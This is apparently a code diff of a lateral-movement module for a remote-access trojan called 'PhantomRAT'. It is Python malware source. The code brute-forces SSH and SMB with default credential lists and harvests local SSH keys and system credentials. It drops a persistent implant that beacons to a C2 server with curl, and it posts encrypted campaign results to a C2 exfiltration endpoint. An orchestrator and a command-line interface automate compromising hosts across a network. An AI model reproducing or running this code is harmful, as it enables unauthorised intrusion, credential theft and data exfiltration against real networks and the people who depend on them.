-        mover = AdvancedLateralMovement()
-        
-        credentials = {
-            'username': user,
-            'password': password,
-            'source': 'brute_force'
-        }
-        
-        result = mover.lateral_move(ip, technique, payload, credentials)
-        
-        if result['success']:
-            print(f"Successfully moved to {ip} using {result['technique_used']}")
-            return True
-        else:
-            print(f"Failed to move to {ip}: {result['details'].get('error', 'Unknown error')}")
-            return False
-            
-    except Exception as e:
-        print(f"Lateral movement error: {e}")
-        return False
-
-def automated_lateral_spread(start_ip, credentials, depth=3, technique='auto'):
-    """
-    Automated lateral spread through network
-    """
-    visited = set()
-    to_visit = [(start_ip, 0)]
-    successful = []
-    
-    mover = AdvancedLateralMovement()
-    
-    while to_visit:
-        current_ip, current_depth = to_visit.pop(0)
-        
-        if current_ip in visited or current_depth > depth:
-            continue
-        
-        visited.add(current_ip)
-        
-        print(f"\n[+] Attempting lateral movement to {current_ip} (depth: {current_depth})")
-        
-        # Try lateral movement
-        result = mover.lateral_move(current_ip, technique, credentials=credentials)
-        
-        if result['success']:
-            successful.append({
-                'ip': current_ip,
-                'depth': current_depth,
-                'technique': result.get('technique_used'),
-                'timestamp': result['timestamp']
-            })
-            
-            print(f"  [+] Success! Using {result.get('technique_used')}")
-            
-            # Discover new hosts from this machine
-            if current_depth < depth:
-                new_hosts = discover_hosts_from(current_ip, credentials)
-                for new_host in new_hosts:
-                    if new_host not in visited:
-                        to_visit.append((new_host, current_depth + 1))
-        else:
-            print(f"  [-] Failed: {result['details'].get('error', 'Unknown')}")
-    
-    return successful
-
-def discover_hosts_from(ip, credentials):
-    """
-    Discover other hosts from compromised machine
-    """
-    discovered = []
-    
-    try:
-        # Try different methods to discover hosts
-        methods = [
-            lambda: _discover_via_arp(ip, credentials),
-            lambda: _discover_via_netstat(ip, credentials),
-            lambda: _discover_via_nbstat(ip, credentials)
+        self.credentials_found = []
+        self.common_users = [
+            'root', 'admin', 'administrator', 'user', 'test',
+            'ubuntu', 'centos', 'debian', 'oracle', 'postgres',
+            'git', 'www-data', 'nginx', 'apache', 'mysql'
         ]
         
-        for method in methods:
-            try:
-                hosts = method()
-                if hosts:
-                    discovered.extend(hosts)
-            except:
-                continue
-        
-        # Remove duplicates
-        discovered = list(set(discovered))
-        
-    except Exception as e:
-        logger.error(f"Host discovery failed: {e}")
+        self.common_passwords = [
+            'password', '123456', 'admin', 'root', 'test',
+            'password123', 'admin123', 'root123', 'qwerty',
+            'letmein', 'welcome', 'monkey', '123456789',
+            '12345678', '12345', '1234', '123', 'abc123'
+        ]
     
-    return discovered
+    def brute_ssh(self, ip, username=None, password=None, port=22):
+        """Brute force SSH service"""
+        print(f"[*] Attempting SSH brute force on {ip}:{port}")
+        
+        # Use provided creds or defaults
+        users = [username] if username else self.common_users
+        passwords = [password] if password else self.common_passwords
+        
+        for user in users:
+            for pwd in passwords:
+                try:
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    
+                    # Quick timeout for brute force
+                    ssh.connect(
+                        ip,
+                        port=port,
+                        username=user,
+                        password=pwd,
+                        timeout=5,
+                        banner_timeout=5,
+                        auth_timeout=5
+                    )
+                    
+                    # Success! Test command execution
+                    stdin, stdout, stderr = ssh.exec_command('whoami', timeout=5)
+                    output = stdout.read().decode().strip()
+                    
+                    credential = {
+                        'ip': ip,
+                        'port': port,
+                        'service': 'SSH',
+                        'username': user,
+                        'password': pwd,
+                        'access_level': output,
+                        'timestamp': time.time()
+                    }
+                    
+                    self.credentials_found.append(credential)
+                    
+                    # Try to deploy implant
+                    self.deploy_implant_ssh(ssh, ip, user)
+                    
+                    ssh.close()
+                    return credential
+                    
+                except paramiko.AuthenticationException:
+                    continue
+                except Exception as e:
+                    # Connection error, move on
+                    continue
+        
+        return None
+    
+    def deploy_implant_ssh(self, ssh_connection, ip, username):
+        """Deploy PhantomRAT implant via SSH"""
+        print(f"[*] Attempting to deploy implant on {ip} as {username}")
+        
+        try:
+            # Check system info
+            stdin, stdout, stderr = ssh_connection.exec_command('uname -a', timeout=5)
+            system_info = stdout.read().decode().strip()
+            
+            # Create implant directory
+            ssh_connection.exec_command('mkdir -p /tmp/.phantom 2>/dev/null', timeout=5)
+            
+            # Upload implant (simplified - in reality would transfer files)
+            implant_command = f"""
+            echo "#!/bin/bash" > /tmp/.phantom/implant.sh
+            echo "while true; do" >> /tmp/.phantom/implant.sh
+            echo "    curl -s {C2_SERVER}/phantom/beacon >> /tmp/.phantom/log" >> /tmp/.phantom/implant.sh
+            echo "    sleep 30" >> /tmp/.phantom/implant.sh
+            echo "done" >> /tmp/.phantom/implant.sh
+            chmod +x /tmp/.phantom/implant.sh
+            nohup /tmp/.phantom/implant.sh >/dev/null 2>&1 &
+            """
+            
+            stdin, stdout, stderr = ssh_connection.exec_command(implant_command, timeout=10)
+            print(f"[+] Implant deployment attempted on {ip}")
+            
+            return True
+            
+        except Exception as e:
+            print(f"[!] Failed to deploy implant on {ip}: {e}")
+            return False
+    
+    def brute_smb(self, ip, username=None, password=None):
+        """Brute force SMB service"""
+        print(f"[*] Attempting SMB brute force on {ip}")
+        
+        if sys.platform != 'win32':
+            print(f"[!] SMB brute force requires Windows or impacket")
+            return None
+        
+        # Windows SMB brute force
+        users = [username] if username else self.common_users
+        passwords = [password] if password else self.common_passwords
+        
+        for user in users:
+            for pwd in passwords:
+                try:
+                    # Using net use command (Windows)
+                    command = f'net use \\\\{ip}\\IPC$ {pwd} /user:{user} 2>&1'
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                    
+                    if 'successfully' in result.stdout.lower():
+                        credential = {
+                            'ip': ip,
+                            'service': 'SMB',
+                            'username': user,
+                            'password': pwd,
+                            'timestamp': time.time()
+                        }
+                        
+                        self.credentials_found.append(credential)
+                        print(f"[+] SMB credentials found: {user}:{pwd} on {ip}")
+                        
+                        # Try to deploy via SMB
+                        self.deploy_implant_smb(ip, user, pwd)
+                        
+                        return credential
+                        
+                except Exception as e:
+                    continue
+        
+        return None
+    
+    def deploy_implant_smb(self, ip, username, password):
+        """Deploy implant via SMB share"""
+        print(f"[*] Attempting SMB implant deployment on {ip}")
+        
+        try:
+            # Mount share
+            mount_cmd = f"net use Z: \\\\{ip}\\C$ {password} /user:{username}"
+            subprocess.run(mount_cmd, shell=True, capture_output=True)
+            
+            # Copy implant (simplified)
+            # In reality, would copy actual implant files
+            
+            print(f"[+] SMB access achieved on {ip}")
+            return True
+            
+        except Exception as e:
+            print(f"[!] SMB deployment failed: {e}")
+            return False
+    
+    def test_winrm(self, ip, username, password):
+        """Test WinRM access"""
+        if sys.platform != 'win32':
+            return False
+        
+        try:
+            command = f'powershell -Command "$cred = New-Object System.Management.Automation.PSCredential(\'{username}\', (ConvertTo-SecureString \'{password}\' -AsPlainText -Force)); Invoke-Command -ComputerName {ip} -Credential $cred -ScriptBlock {{hostname}}"'
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
+            
+            return result.returncode == 0
+        except:
+            return False
 
-def _discover_via_arp(ip, credentials):
-    """Discover hosts via ARP table"""
-    hosts = []
+# ==================== LATERAL MOVEMENT ORCHESTRATOR ====================
+class LateralMovementOrchestrator:
+    """Main orchestrator for lateral movement attacks"""
     
-    try:
-        # SSH to host and get ARP table
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ip, 
-                   username=credentials.get('username'),
-                   password=credentials.get('password'),
-                   timeout=10)
+    def __init__(self):
+        self.scanner = NetworkScanner()
+        self.harvester = CredentialHarvester()
+        self.brute_forcer = BruteForceEngine()
+        self.compromised_hosts = []
         
-        # Get ARP table
-        stdin, stdout, stderr = ssh.exec_command('arp -a')
-        output = stdout.read().decode() + stderr.read().decode()
-        ssh.close()
+    def discover_network(self):
+        """Discover network and identify targets"""
+        print(f"[*] Starting network discovery...")
         
-        # Parse ARP output
-        import re
-        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
-        ips = re.findall(ip_pattern, output)
+        # ARP scan for active hosts
+        active_hosts = self.scanner.arp_scan()
+        print(f"[+] Found {len(active_hosts)} active hosts")
         
-        hosts = [ip for ip in ips if ip != '0.0.0.0' and not ip.startswith('127.')]
+        # Port scan interesting hosts
+        for host in active_hosts[:10]:  # Limit to first 10 hosts
+            if host['alive']:
+                print(f"[*] Scanning ports on {host['ip']}...")
+                open_ports = self.scanner.port_scan(host['ip'])
+                
+                if open_ports:
+                    print(f"[+] {host['ip']} has open ports: {[p['port'] for p in open_ports]}")
+                    
+                    # Check for lateral movement opportunities
+                    lateral_ports = [22, 445, 3389, 5985, 5986]
+                    if any(p['port'] in lateral_ports for p in open_ports):
+                        host['lateral_possible'] = True
+                        host['open_ports'] = open_ports
         
-    except:
-        pass
+        return [h for h in active_hosts if h.get('lateral_possible', False)]
     
-    return hosts
+    def harvest_local_credentials(self):
+        """Harvest credentials from local system"""
+        print(f"[*] Harvesting local credentials...")
+        
+        ssh_keys = self.harvester.harvest_ssh_keys()
+        ssh_configs = self.harvester.harvest_ssh_configs()
+        system_creds = self.harvester.harvest_system_credentials()
+        
+        print(f"[+] Found {len(ssh_keys)} SSH keys")
+        print(f"[+] Found {len(ssh_configs)} SSH configs")
+        print(f"[+] Harvested system credentials")
+        
+        return {
+            'ssh_keys': ssh_keys,
+            'ssh_configs': ssh_configs,
+            'system_creds': system_creds
+        }
+    
+    def execute_lateral_attack(self, target_ip, credentials=None):
+        """Execute lateral movement attack on target"""
+        print(f"[*] Attempting lateral movement to {target_ip}")
+        
+        results = {
+            'target': target_ip,
+            'success': False,
+            'method': None,
+            'credentials': None,
+            'implant_deployed': False,
+            'timestamp': time.time()
+        }
+        
+        # First, try SSH if port 22 is open
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            ssh_open = sock.connect_ex((target_ip, 22)) == 0
+            sock.close()
+            
+            if ssh_open:
+                print(f"[*] SSH port open on {target_ip}, attempting brute force...")
+                
+                # Try harvested credentials first
+                if credentials and 'ssh_keys' in credentials:
+                    # Try key-based authentication
+                    pass  # Implement key auth
+                
+                # Try brute force
+                ssh_creds = self.brute_forcer.brute_ssh(target_ip)
+                
+                if ssh_creds:
+                    results['success'] = True
+                    results['method'] = 'SSH'
+                    results['credentials'] = ssh_creds
+                    results['implant_deployed'] = True
+                    self.compromised_hosts.append(results)
+                    return results
+        except:
+            pass
+        
+        # Try SMB if port 445 is open
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            smb_open = sock.connect_ex((target_ip, 445)) == 0
+            sock.close()
+            
+            if smb_open:
+                print(f"[*] SMB port open on {target_ip}, attempting access...")
+                
+                smb_creds = self.brute_forcer.brute_smb(target_ip)
+                
+                if smb_creds:
+                    results['success'] = True
+                    results['method'] = 'SMB'
+                    results['credentials'] = smb_creds
+                    results['implant_deployed'] = True
+                    self.compromised_hosts.append(results)
+                    return results
+        except:
+            pass
+        
+        print(f"[-] Failed lateral movement to {target_ip}")
+        return results
+    
+    def automated_lateral_campaign(self, max_targets=5):
+        """Run automated lateral movement campaign"""
+        print(f"[*] Starting automated lateral movement campaign")
+        print(f"[*] Maximum targets: {max_targets}")
+        print("-" * 50)
+        
+        # Step 1: Network discovery
+        print(f"\n[PHASE 1] Network Discovery")
+        lateral_targets = self.discover_network()
+        
+        if not lateral_targets:
+            print(f"[-] No suitable lateral movement targets found")
+            return []
+        
+        print(f"[+] Found {len(lateral_targets)} potential lateral movement targets")
+        
+        # Step 2: Credential harvesting
+        print(f"\n[PHASE 2] Credential Harvesting")
+        harvested_creds = self.harvest_local_credentials()
+        
+        # Step 3: Lateral movement attempts
+        print(f"\n[PHASE 3] Lateral Movement Execution")
+        compromised_hosts = []
+        
+        for i, target in enumerate(lateral_targets[:max_targets]):
+            print(f"\n[*] Target {i+1}/{len(lateral_targets[:max_targets])}: {target['ip']}")
+            
+            result = self.execute_lateral_attack(target['ip'], harvested_creds)
+            
+            if result['success']:
+                print(f"[+] Successfully compromised {target['ip']} via {result['method']}")
+                compromised_hosts.append(result)
+                
+                # Brief pause between attacks
+                time.sleep(random.uniform(2, 5))
+            else:
+                print(f"[-] Failed to compromise {target['ip']}")
+        
+        print(f"\n[+] Campaign complete: {len(compromised_hosts)}/{len(lateral_targets[:max_targets])} hosts compromised")
+        return compromised_hosts
 
-def _discover_via_netstat(ip, credentials):
-    """Discover hosts via netstat connections"""
-    hosts = []
-    
-    try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ip,
-                   username=credentials.get('username'),
-                   password=credentials.get('password'),
-                   timeout=10)
-        
-        # Get netstat output
-        stdin, stdout, stderr = ssh.exec_command('netstat -an')
-        output = stdout.read().decode() + stderr.read().decode()
-        ssh.close()
-        
-        # Parse for IP addresses
-        import re
-        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
-        ips = re.findall(ip_pattern, output)
-        
-        # Filter and deduplicate
-        hosts = []
-        for ip_addr in ips:
-            if (ip_addr != '0.0.0.0' and 
-                not ip_addr.startswith('127.') and 
-                ip_addr != ip and
-                ip_addr not in hosts):
-                hosts.append(ip_addr)
-        
-    except:
-        pass
-    
-    return hosts
-
-def _discover_via_nbstat(ip, credentials):
-    """Discover hosts via NetBIOS (Windows)"""
-    hosts = []
-    
-    try:
-        # This would use Windows commands
-        # For now, return empty list
-        pass
-    except:
-        pass
-    
-    return hosts
-
-if __name__ == "__main__":
-    # Test lateral movement
-    print("Testing Advanced Lateral Movement...")
-    
-    # Initialize
-    mover = AdvancedLateralMovement()
-    
-    # Test credentials
-    test_credentials = {
-        'username': 'Administrator',
-        'password': 'Password123!',
-        'domain': 'WORKGROUP'
+# ==================== C2 COMMUNICATION ====================
+def send_to_c2(endpoint, data):
+    """Send data to C2 server"""
+    headers = {
+        'User-Agent': USER_AGENT,
+        'X-Phantom-Module': 'LateralMovement',
+        'X-Phantom-Session': SESSION_ID,
+        'X-Phantom-Version': '4.0'
     }
     
-    # Test different techniques (simulated)
-    test_target = '192.168.1.100'
-    
-    print(f"\nTesting techniques against {test_target}:")
-    
-    techniques = ['ssh', 'smb', 'wmi', 'winrm']
-    
-    for technique in techniques:
-        print(f"\n  Testing {technique}...")
-        success, details = mover.lateral_move(test_target, technique, credentials=test_credentials)
+    try:
+        encrypted_data = encryption.encrypt(data)
         
-        if success:
-            print(f"    ✓ Success: {details.get('output', 'Connected')[:50]}...")
+        response = requests.post(
+            f"{C2_SERVER}{endpoint}",
+            data=encrypted_data,
+            headers=headers,
+            timeout=30,
+            verify=False
+        )
+        
+        if response.status_code == 200:
+            try:
+                return encryption.decrypt(response.content)
+            except:
+                return {'status': 'received'}
+        return {'error': f'HTTP {response.status_code}'}
+    except Exception as e:
+        print(f"[!] C2 communication error: {e}")
+        return {'error': str(e)}
+
+def exfil_lateral_results(results):
+    """Exfiltrate lateral movement results to C2"""
+    exfil_data = {
+        'module': 'lateral_movement',
+        'session_id': SESSION_ID,
+        'hostname': socket.gethostname(),
+        'ip': socket.gethostbyname(socket.gethostname()),
+        'timestamp': datetime.now().isoformat(),
+        'results': results,
+        'campaign_summary': {
+            'total_targets': len(results),
+            'successful_targets': len([r for r in results if r['success']]),
+            'compromised_hosts': [r['target'] for r in results if r['success']],
+            'methods_used': list(set([r['method'] for r in results if r['method']]))
+        }
+    }
+    
+    result = send_to_c2('/phantom/exfil', exfil_data)
+    return result
+
+# ==================== MAIN FUNCTION ====================
+def perform_lateral_movement_campaign(max_targets=3, exfil_to_c2=True):
+    """Main lateral movement function"""
+    print(f"""
+    ╔══════════════════════════════════════════════════╗
+    ║         PHANTOM RAT LATERAL MOVEMENT           ║
+    ║                   v4.0                          ║
+    ╚══════════════════════════════════════════════════╝
+    """)
+    
+    print(f"[*] Session ID: {SESSION_ID}")
+    print(f"[*] Source Host: {socket.gethostname()}")
+    print(f"[*] Source IP: {socket.gethostbyname(socket.gethostname())}")
+    print(f"[*] Max Targets: {max_targets}")
+    print(f"[*] C2 Reporting: {exfil_to_c2}")
+    print("-" * 50)
+    
+    # Initialize orchestrator
+    orchestrator = LateralMovementOrchestrator()
+    
+    # Run automated campaign
+    results = orchestrator.automated_lateral_campaign(max_targets)
+    
+    # Report to C2
+    if exfil_to_c2 and results:
+        print(f"\n[*] Reporting results to C2...")
+        c2_result = exfil_lateral_results(results)
+        
+        if c2_result and 'error' not in c2_result:
+            print(f"[+] Results successfully sent to C2")
         else:
-            print(f"    ✗ Failed: {details.get('error', 'Unknown error')}")
+            print(f"[-] Failed to send results to C2")
     
-    # Test automated spread
-    print(f"\n\nTesting automated lateral spread...")
+    # Summary
+    print(f"\n[+] Campaign Summary:")
+    print(f"    Targets Attempted: {len(results)}")
+    print(f"    Successfully Compromised: {len([r for r in results if r['success']])}")
     
-    successful = automated_lateral_spread(
-        start_ip='192.168.1.1',
-        credentials=test_credentials,
-        depth=2,
-        technique='auto'
-    )
+    if orchestrator.compromised_hosts:
+        print(f"\n[+] Compromised Hosts:")
+        for host in orchestrator.compromised_hosts:
+            print(f"    • {host['target']} via {host['method']}")
     
-    print(f"\nSpread complete. Successfully compromised {len(successful)} hosts:")
-    for host in successful:
-        print(f"  - {host['ip']} (depth: {host['depth']}, technique: {host['technique']})")
+    return results
+
+# ==================== COMMAND LINE INTERFACE ====================
+def main():
+    """Command line interface"""
+    import argparse
+    import random
+    
+    parser = argparse.ArgumentParser(description='PhantomRAT Lateral Movement Module v4.0')
+    parser.add_argument('--campaign', action='store_true', help='Run automated lateral movement campaign')
+    parser.add_argument('--scan', action='store_true', help='Scan network only (no attacks)')
+    parser.add_argument('--harvest', action='store_true', help='Harvest credentials only')
+    parser.add_argument('--target', type=str, help='Attack specific target IP')
+    parser.add_argument('--max-targets', type=int, default=3, help='Maximum targets for campaign')
+    parser.add_argument('--test', action='store_true', help='Test mode (no actual attacks)')
+    
+    args = parser.parse_args()
+    
+    if args.test:
+        print(f"[*] Running in TEST mode")
+        # Test network scanner
+        scanner = NetworkScanner()
+        hosts = scanner.arp_scan()
+        print(f"[*] Found {len(hosts)} active hosts")
+        
+        if hosts:
+            print(f"[*] Sample hosts:")
+            for host in hosts[:3]:
+                print(f"    • {host['ip']} - Alive: {host['alive']}")
+        
+        # Test credential harvester
+        harvester = CredentialHarvester()
+        ssh_keys = harvester.harvest_ssh_keys()
+        print(f"[*] Found {len(ssh_keys)} SSH keys")
+        
+        return
+    
+    if args.scan:
+        scanner = NetworkScanner()
+        hosts = scanner.discover_network()
+        
+        if hosts:
+            print(f"\n[+] Lateral Movement Targets:")
+            for host in hosts:
+                print(f"\n    IP: {host['ip']}")
+                if 'open_ports' in host:
+                    print(f"    Open Ports: {[p['port'] for p in host['open_ports']]}")
+        else:
+            print(f"[-] No lateral movement targets found")
+        
+        return
+    
+    if args.harvest:
+        harvester = CredentialHarvester()
+        
+        ssh_keys = harvester.harvest_ssh_keys()
+        ssh_configs = harvester.harvest_ssh_configs()
+        system_creds = harvester.harvest_system_credentials()
+        
+        print(f"\n[+] Credential Harvest Results:")
+        print(f"    SSH Keys: {len(ssh_keys)}")
+        print(f"    SSH Configs: {len(ssh_configs)}")
+        print(f"    System Creds: {len(system_creds)}")
+        
+        if ssh_configs:
+            print(f"\n[+] SSH Hosts from configs:")
+            for config in ssh_configs:
+                if config['hosts']:
+                    print(f"    {config['path']}: {', '.join(config['hosts'])}")
+        
+        return
+    
+    if args.target:
+        print(f"[*] Targeting specific IP: {args.target}")
+        
+        orchestrator = LateralMovementOrchestrator()
+        
+        # Scan target
+        print(f"[*] Scanning target...")
+        open_ports = orchestrator.scanner.port_scan(args.target)
+        
+        if open_ports:
+            print(f"[+] Open ports on {args.target}: {[p['port'] for p in open_ports]}")
+            
+            # Attempt attack
+            result = orchestrator.execute_lateral_attack(args.target)
+            
+            if result['success']:
+                print(f"[+] Successfully compromised {args.target}")
+                print(f"[+] Method: {result['method']}")
+            else:
+                print(f"[-] Failed to compromise {args.target}")
+        else:
+            print(f"[-] No open ports found on {args.target}")
+        
+        return
+    
+    if args.campaign:
+        print(f"[*] Starting lateral movement campaign...")
+        print(f"[*] WARNING: This will attempt to compromise other systems!")
+        
+        response = input(f"[?] Are you sure you want to continue? (yes/NO): ")
+        
+        if response.lower() == 'yes':
+            results = perform_lateral_movement_campaign(args.max_targets)
+            
+            if results:
+                print(f"\n[+] Campaign completed successfully")
+            else:
+                print(f"\n[-] Campaign failed or no targets compromised")
+        else:
+            print(f"[*] Operation cancelled")
+    else:
+        parser.print_help()
+
+if __name__ == '__main__':
+    import random
+    main()
